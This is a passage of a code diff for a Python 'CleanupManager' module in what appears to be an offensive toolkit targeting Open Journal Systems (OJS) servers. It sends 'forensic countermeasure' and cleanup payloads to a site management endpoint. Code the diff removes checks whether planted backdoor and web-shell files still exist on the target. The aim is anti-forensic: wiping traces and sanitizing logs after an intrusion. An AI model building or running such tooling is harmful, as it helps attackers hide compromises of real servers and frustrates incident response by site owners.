+                    # Try to apply countermeasure
+                    cm_url = urljoin(target_url, '/index.php/index/manager/setup/1')
+                    
+                    cm_data = {
+                        'action': 'apply_countermeasure',
+                        'type': cm_type,
+                        'command': payload
+                    }
+                    
+                    if self.http_client:
+                        response = self.http_client.post(cm_url, data=cm_data)
+                    else:
+                        response = requests.post(cm_url, data=cm_data)
+                    
+                    if response.status_code in [200, 201, 302]:
+                        items_cleaned += 1
+                        details[cm_type] = 'applied'
+                    else:
+                        items_failed += 1
+                        details[cm_type] = f'failed: {response.status_code}'
+                
+                except Exception as e:
+                    items_failed += 1
+                    details[cm_type] = f'error: {str(e)}'
+            
+            return CleanupResult(
+                success=items_cleaned > 0,
+                cleanup_type=CleanupType.FORENSIC_COUNTERMEASURES,
+                target_url=target_url,
+                items_cleaned=items_cleaned,
+                items_failed=items_failed,
+                details=details,
+                session_id=session_id
+            )
+            
+        except Exception as e:
+            return CleanupResult(
+                success=False,
+                cleanup_type=CleanupType.FORENSIC_COUNTERMEASURES,
+                target_url=target_url,
+                items_cleaned=0,
+                items_failed=1,
+                details={'error': str(e)},
+                error_message=str(e),
+                session_id=session_id
+            )
+    
+    def _execute_generic_cleanup(self, target_url: str, cleanup_type: CleanupType,
+                                payload: str, session_id: str = None) -> CleanupResult:
+        """Execute generic cleanup operation."""
+        try:
+            # Try to execute generic cleanup
+            cleanup_url = urljoin(target_url, '/index.php/index/manager/setup/1')
+            
+            cleanup_data = {
+                'action': 'generic_cleanup',
+                'type': cleanup_type.value,
+                'payload': payload
+            }
+            
+            if self.http_client:
+                response = self.http_client.post(cleanup_url, data=cleanup_data)
+            else:
+                response = requests.post(cleanup_url, data=cleanup_data)
+            
+            if response.status_code in [200, 201, 302]:
                 return CleanupResult(
-                    success=execute_response.status_code == 200,
+                    success=True,
                     cleanup_type=cleanup_type,
                     target_url=target_url,
-                    cleaned_items=self._extract_cleaned_items(execute_response.text),
-                    removed_files=self._extract_removed_files(execute_response.text),
-                    sanitized_logs=self._extract_sanitized_logs(execute_response.text),
+                    items_cleaned=1,
+                    items_failed=0,
+                    details={'generic_cleanup': 'success'},
                     session_id=session_id
                 )
             else:
@@ -742,108 +594,101 @@ echo "Forensic cleanup completed";
                     success=False,
                     cleanup_type=cleanup_type,
                     target_url=target_url,
-                    cleaned_items=[],
-                    removed_files=[],
-                    sanitized_logs=[],
-                    error_message="Failed to upload cleanup script",
+                    items_cleaned=0,
+                    items_failed=1,
+                    details={'generic_cleanup': f'failed: {response.status_code}'},
+                    error_message=f"Generic cleanup failed with status {response.status_code}",
                     session_id=session_id
                 )
                 
         except Exception as e:
-            self.logger.error(f"Cleanup execution failed: {e}")
             return CleanupResult(
                 success=False,
                 cleanup_type=cleanup_type,
                 target_url=target_url,
-                cleaned_items=[],
-                removed_files=[],
-                sanitized_logs=[],
+                items_cleaned=0,
+                items_failed=1,
+                details={'error': str(e)},
                 error_message=str(e),
                 session_id=session_id
             )
     
-    def _extract_cleaned_items(self, response_text: str) -> List[str]:
-        """Extract cleaned items from response."""
-        items = []
+    def sanitize_log_entry(self, log_entry: str, patterns: List[str] = None) -> str:
+        """Sanitize a single log entry."""
+        if patterns is None:
+            patterns = list(self.cleanup_patterns.keys())
         
-        # Look for cleaned items in response
-        patterns = [
-            r'cleaned:\s*(.*?)(?:\n|$)',
-            r'removed:\s*(.*?)(?:\n|$)',
-            r'deleted:\s*(.*?)(?:\n|$)',
-        ]
+        sanitized_entry = log_entry
         
-        for pattern in patterns:
-            matches = re.findall(pattern, response_text, re.IGNORECASE)
-            items.extend(matches)
+        for pattern_type in patterns:
+            if pattern_type in self.cleanup_patterns:
+                for pattern in self.cleanup_patterns[pattern_type]:
+                    sanitized_entry = re.sub(pattern, f'[{pattern_type.upper()}_REDACTED]', sanitized_entry)
         
-        return items
+        return sanitized_entry
     
-    def _extract_removed_files(self, response_text: str) -> List[str]:
-        """Extract removed files from response."""
-        files = []
+    def generate_cleanup_report(self, cleanup_results: List[CleanupResult]) -> Dict[str, Any]:
+        """Generate a comprehensive cleanup report."""
+        report = {
+            'total_operations': len(cleanup_results),
+            'successful_operations': len([r for r in cleanup_results if r.success]),
+            'failed_operations': len([r for r in cleanup_results if not r.success]),
+            'total_items_cleaned': sum([r.items_cleaned for r in cleanup_results]),
+            'total_items_failed': sum([r.items_failed for r in cleanup_results]),
+            'cleanup_by_type': {},
+            'failed_operations': [],
+            'recommendations': []
+        }
         
-        # Look for removed files in response
-        patterns = [
-            r'file.*?removed:\s*(.*?)(?:\n|$)',
-            r'deleted.*?file:\s*(.*?)(?:\n|$)',
-            r'unlink.*?:\s*(.*?)(?:\n|$)',
-        ]
-        
-        for pattern in patterns:
-            matches = re.findall(pattern, response_text, re.IGNORECASE)
-            files.extend(matches)
-        
-        return files
-    
-    def _extract_sanitized_logs(self, response_text: str) -> List[str]:
-        """Extract sanitized logs from response."""
-        logs = []
-        
-        # Look for sanitized logs in response
-        patterns = [
-            r'log.*?sanitized:\s*(.*?)(?:\n|$)',
-            r'sanitized.*?log:\s*(.*?)(?:\n|$)',
-            r'cleaned.*?log:\s*(.*?)(?:\n|$)',
-        ]
-        
-        for pattern in patterns:
-            matches = re.findall(pattern, response_text, re.IGNORECASE)
-            logs.extend(matches)
-        
-        return logs
-    
-    def _verify_cleanup(self, target_url: str, session_id: str) -> bool:
-        """Verify that cleanup was successful."""
-        try:
-            # Check for remaining evidence files
-            evidence_files = [
-                '/tmp/backdoor.php',
-                '/tmp/shell.php',
-                '/var/www/backdoor.php',
-                '/public_html/backdoor.php',
-            ]
+        # Categorize cleanup operations
+        for result in cleanup_results:
+            cleanup_type = result.cleanup_type.value
+            if cleanup_type not in report['cleanup_by_type']:
+                report['cleanup_by_type'][cleanup_type] = {
+                    'total': 0,
+                    'successful': 0,
+                    'failed': 0,
+                    'items_cleaned': 0,
+                    'items_failed': 0
+                }
             
-            for file_path in evidence_files:
-                full_url = urljoin(target_url, file_path)
-                response = self.http_client.get(full_url)
-                if response.status_code == 200:
-                    return False  # Evidence still exists
+            report['cleanup_by_type'][cleanup_type]['total'] += 1
+            if result.success:
+                report['cleanup_by_type'][cleanup_type]['successful'] += 1
+            else:
+                report['cleanup_by_type'][cleanup_type]['failed'] += 1
+                report['failed_operations'].append({
+                    'type': cleanup_type,
+                    'target': result.target_url,
+                    'error': result.error_message
+                })
             
-            return True
-            
-        except Exception as e:
-            self.logger.debug(f"Cleanup verification failed: {e}")
-            return False
+            report['cleanup_by_type'][cleanup_type]['items_cleaned'] += result.items_cleaned
+            report['cleanup_by_type'][cleanup_type]['items_failed'] += result.items_failed
+        
+        # Generate recommendations
+        if report['failed_operations']:
+            report['recommendations'].append("Review failed cleanup operations and retry if necessary")
+        
+        if report['total_items_failed'] > 0:
+            report['recommendations'].append("Some items failed to clean up - manual intervention may be required")
+        
+        report['recommendations'].extend([
+            "Monitor system logs for any remaining traces",
+            "Consider implementing additional security measures",
+            "Review and update incident response procedures"
+        ])
+        
+        return report
     
     def get_cleanup_info(self) -> Dict[str, Any]:
-        """Get information about cleanup operations."""
+        """Get information about the cleanup manager module."""
         return {
-            'name': 'Cleanup Manager',
-            'description': 'Manages various cleanup operations for OJS',
+            'name': 'CleanupManager',
+            'description': 'Cleanup and forensic countermeasures module for OJS',
             'cleanup_types': [t.value for t in CleanupType],
-            'locations': self.cleanup_locations,
-            'log_files': self.log_files,
-            'evidence_patterns': self.evidence_patterns,
-            'payloads': list(self.cleanup_payloads.keys())
+            'cleanup_locations': {k: len(v) for k, v in self.cleanup_locations.items()},
+            'cleanup_patterns': list(self.cleanup_patterns.keys()),
+            'forensic_countermeasures': list(self.forensic_countermeasures.keys()),
+            'cleanup_payloads': {t.value: len(p) for t, p in self.cleanup_payloads.items()}
         }
